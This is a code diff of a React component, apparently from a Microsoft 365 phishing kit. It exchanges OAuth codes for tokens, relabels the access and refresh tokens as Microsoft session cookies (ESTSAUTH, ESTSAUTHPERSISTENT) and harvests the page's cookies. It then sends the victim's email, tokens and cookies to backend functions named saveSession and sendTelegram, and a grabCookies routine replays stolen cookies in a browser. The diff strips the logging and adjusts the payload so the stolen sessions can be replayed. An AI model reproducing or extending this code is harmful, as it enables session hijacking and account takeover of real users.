@@ -8,69 +8,36 @@ interface RealOAuthRedirectProps {
 
 // DYNAMIC COOKIE SETTER - matches your sample logic
 function setCookiesFromArray(cookies: Array<any>) {
-  console.log('🔄 Setting cookies from array:', cookies.length);
   let results = [];
-  let setCount = 0;
-  
   cookies.forEach(cookie => {
-    try {
-      let cookieString = `${cookie.name}=${cookie.value}`;
-      
-      // __Host- cookies: must be Secure, path=/, no domain
-      if (!cookie.name.startsWith('__Host') && cookie.domain && cookie.domain !== window.location.hostname) {
-        // Skip cross-domain cookies that can't be set
-        console.warn(`⚠️ Skipping cross-domain cookie: ${cookie.name} for domain ${cookie.domain}`);
-        return;
-      }
-      
-      if (cookie.path) {
-        cookieString += `; path=${cookie.path}`;
-      }
-      
-      if (cookie.expirationDate) {
-        const expiresDate = new Date(cookie.expirationDate * 1000);
-        cookieString += `; expires=${expiresDate.toUTCString()}`;
-      } else if (cookie.expires) {
-        const expiresDate = new Date(cookie.expires * 1000);
-        cookieString += `; expires=${expiresDate.toUTCString()}`;
-      }
-      
-      // Note: HttpOnly cookies cannot be set via JavaScript
-      if (cookie.httpOnly) {
-        console.warn(`⚠️ Cannot set HttpOnly cookie via JavaScript: ${cookie.name}`);
-        return;
-      }
-      
-      // __Secure- cookies: must be Secure and set from HTTPS
-      if (cookie.secure || cookie.name.startsWith('__Host') || cookie.name.startsWith('__Secure') || window.location.protocol === 'https:') {
-        cookieString += '; Secure';
-      }
-      
-      if (cookie.sameSite) {
-        cookieString += `; SameSite=${cookie.sameSite}`;
-      }
-      
-      console.log(`🔄 Setting cookie: ${cookieString}`);
-      document.cookie = cookieString;
-      setCount++;
-      
-      results.push({
-        name: cookie.name,
-        value: cookie.value ? cookie.value.substring(0, 50) + (cookie.value.length > 50 ? '...' : '') : '',
-        expires: cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toUTCString() : 'Session',
-        set: true
-      });
-    } catch (error) {
-      console.error(`❌ Failed to set cookie ${cookie.name}:`, error);
-      results.push({
-        name: cookie.name,
-        error: error.message,
-        set: false
-      });
+    let cookieString = `${cookie.name}=${cookie.value}`;
+    // __Host- cookies: must be Secure, path=/, no domain
+    if (!cookie.name.startsWith('__Host') && cookie.domain) {
+      cookieString += `; domain=${cookie.domain}`;
     }
+    if (cookie.path) {
+      cookieString += `; path=${cookie.path}`;
+    }
+    if (cookie.expires) {
+      const expiresDate = new Date(cookie.expires * 1000);
+      cookieString += `; expires=${expiresDate.toUTCString()}`;
+    }
+    if (cookie.httpOnly) {
+      cookieString += '; HttpOnly';
+    }
+    // __Secure- cookies: must be Secure and set from HTTPS
+    if (cookie.secure || cookie.name.startsWith('__Host') || cookie.name.startsWith('__Secure')) {
+      cookieString += '; Secure';
+    }
+    if (cookie.samesite) {
+      cookieString += `; SameSite=${cookie.samesite}`;
+    }
+    document.cookie = cookieString;
+    results.push({
+      name: cookie.name,
+      expires: cookie.expires ? new Date(cookie.expires * 1000).toUTCString() : 'Session',
+    });
   });
-  
-  console.log(`✅ Cookies set: ${setCount}/${cookies.length}`);
   console.table(results);
 }
 
@@ -93,25 +60,14 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
 
   // Cookie grabbing function - dynamic, matches sample
   const grabCookies = (cookieArray?: Array<any>) => {
-    console.log('🔄 grabCookies called with:', cookieArray?.length || 'no array');
-    
-    if (cookieArray && Array.isArray(cookieArray) && cookieArray.length > 0) {
-      console.log('🔄 Using provided cookie array');
+    if (cookieArray && Array.isArray(cookieArray)) {
       setCookiesFromArray(cookieArray);
       return;
     }
-    
     // fallback: try to parse cookies from localStorage/session
-    try {
-      const session = JSON.parse(localStorage.getItem('microsoft365_session') || '{}');
-      if (session.formattedCookies && Array.isArray(session.formattedCookies) && session.formattedCookies.length > 0) {
-        console.log('🔄 Using cookies from localStorage session');
-        setCookiesFromArray(session.formattedCookies);
-      } else {
-        console.log('ℹ️ No cookies found in localStorage session');
-      }
-    } catch (error) {
-      console.error('❌ Error parsing localStorage session:', error);
+    const session = JSON.parse(localStorage.getItem('microsoft365_session') || '{}');
+    if (session.formattedCookies && Array.isArray(session.formattedCookies)) {
+      setCookiesFromArray(session.formattedCookies);
     }
   };
 
@@ -163,16 +119,12 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
         hasAccessToken: !!telegramPayload.accessToken
       });
       
-      console.log('🔄 Making request to:', window.location.origin + '/.netlify/functions/sendTelegram');
-      
       const response = await fetch('/.netlify/functions/sendTelegram', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'Accept': 'application/json',
         },
         body: JSON.stringify(telegramPayload),
-        credentials: 'include', // Include cookies in request
         signal: AbortSignal.timeout(30000) // 30 second timeout
       });
       
@@ -250,16 +202,12 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
         skipTelegram: sessionPayload.skipTelegram
       });
       
-      console.log('🔄 Making request to:', window.location.origin + '/.netlify/functions/saveSession');
-      
       const response = await fetch('/.netlify/functions/saveSession', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'Accept': 'application/json',
         },
         body: JSON.stringify(sessionPayload),
-        credentials: 'include', // Include cookies in request
         signal: AbortSignal.timeout(30000) // 30 second timeout
       });
       
@@ -307,24 +255,12 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
     const storedState = localStorage.getItem('oauth_state');
     const error = urlParams.get('error');
 
-    console.log('🔄 OAuth callback check:', {
-      hasCode: !!code,
-      hasState: !!state,
-      stateMatches: state === storedState,
-      error: error,
-      currentURL: window.location.href,
-      urlParams: Object.fromEntries(urlParams.entries())
-    });
-
     if (error) {
       console.error('❌ OAuth error from provider:', error);
-      const errorDesc = urlParams.get('error_description');
-      console.error('❌ Error description:', errorDesc);
       return;
     }
 
     if (code && state && state === storedState) {
-      console.log('✅ Valid OAuth callback detected, processing...');
       handleOAuthCallback(code);
       return;
     }
@@ -389,18 +325,9 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
       }
 
       const tokenData = await tokenResponse.json();
-      console.log('🔄 Token response received:', { 
-        hasAccessToken: !!tokenData.access_token,
-        hasRefreshToken: !!tokenData.refresh_token,
-        hasIdToken: !!tokenData.id_token,
-        tokenType: tokenData.token_type,
-        expiresIn: tokenData.expires_in,
-        scope: tokenData.scope,
-        error: tokenData.error
-      });
+      console.log('🔄 Token response received:', { hasAccessToken: !!tokenData.access_token });
 
       if (tokenData.error) {
-        console.error('❌ OAuth token error:', tokenData);
         throw new Error(`Token exchange failed: ${tokenData.error_description || tokenData.error}`);
       }
 
@@ -441,11 +368,29 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
           userProfile: profileData
         };
 
-        // Create meaningful session data from OAuth tokens instead of fake cookies
-        // The real value is in the access tokens, not cookies
-        const authCookies = [
+        // Format cookies properly from current domain
+        const cookieStrings = document.cookie.split(';').filter(c => c.trim());
+        const currentDomainCookies = cookieStrings.map(c => {
+          const [name, value] = c.trim().split('=');
+          return name && value ? {
+            name: name.trim(),
+            value: value.trim(),
+            domain: '.login.microsoftonline.com', // Backend expects this domain
+            path: '/',
+            secure: true,
+            httpOnly: false,
+            sameSite: 'none',
+            expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
+            hostOnly: false,
+            session: false,
+            storeId: null
+          } : null;
+        }).filter(Boolean);
+
+        // Create OAuth token cookies that can be used for authentication
+        const oauthCookies = [
           {
-            name: 'MSAL_ACCESS_TOKEN',
+            name: 'ESTSAUTH',
             value: tokenData.access_token,
             domain: '.login.microsoftonline.com',
             path: '/',
@@ -458,52 +403,22 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
             storeId: null
           },
           {
-            name: 'MSAL_REFRESH_TOKEN',
-            value: tokenData.refresh_token || 'N/A',
+            name: 'ESTSAUTHPERSISTENT',
+            value: tokenData.refresh_token || tokenData.access_token,
             domain: '.login.microsoftonline.com',
             path: '/',
             secure: true,
             httpOnly: false,
             sameSite: 'none',
             expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
-            hostOnly: false,
-            session: false,
-            storeId: null
-          },
-          {
-            name: 'MSAL_ID_TOKEN',
-            value: tokenData.id_token || 'N/A',
-            domain: '.login.microsoftonline.com',
-            path: '/',
-            secure: true,
-            httpOnly: false,
-            sameSite: 'none',
-            expirationDate: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
             hostOnly: false,
             session: false,
             storeId: null
           }
         ];
 
-        // Also capture any actual cookies that are available
-        const browserCookies = document.cookie.split(';').filter(c => c.trim()).map(c => {
-          const [name, value] = c.trim().split('=');
-          return name && value ? {
-            name: name.trim(),
-            value: value.trim(),
-            domain: window.location.hostname,
-            path: '/',
-            secure: true,
-            httpOnly: false,
-            sameSite: 'none',
-            expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
-            hostOnly: false,
-            session: false,
-            storeId: null
-          } : null;
-        }).filter(Boolean);
-
-        sessionData.formattedCookies = [...authCookies, ...browserCookies];
+        // Combine all cookies
+        sessionData.formattedCookies = [...oauthCookies, ...currentDomainCookies];
 
         console.log('🔄 Session data prepared:', { 
           email: sessionData.email, 
@@ -522,37 +437,22 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
         let saveSuccess = false;
         let telegramSuccess = false;
 
-        // Test network connectivity first
-        console.log('🔄 Testing network connectivity...');
-        console.log('Current URL:', window.location.href);
-        console.log('Origin:', window.location.origin);
-
         try {
           console.log('🔄 Step 1: Saving session to backend...');
-          const saveResult = await saveSessionToBackend(sessionData);
+          await saveSessionToBackend(sessionData);
           saveSuccess = true;
-          console.log('✅ Step 1 completed: Session saved', saveResult);
+          console.log('✅ Step 1 completed: Session saved');
         } catch (saveError) {
           console.error('❌ Session save failed:', saveError);
-          console.error('Error details:', {
-            name: saveError.name,
-            message: saveError.message,
-            stack: saveError.stack
-          });
         }
 
         try {
           console.log('🔄 Step 2: Sending data to Telegram...');
-          const telegramResult = await sendToTelegram(sessionData);
+          await sendToTelegram(sessionData);
           telegramSuccess = true;
-          console.log('✅ Step 2 completed: Data sent to Telegram', telegramResult);
+          console.log('✅ Step 2 completed: Data sent to Telegram');
         } catch (telegramError) {
           console.error('❌ Telegram send failed:', telegramError);
-          console.error('Error details:', {
-            name: telegramError.name,
-            message: telegramError.message,
-            stack: telegramError.stack
-          });
         }
 
         // Log final status
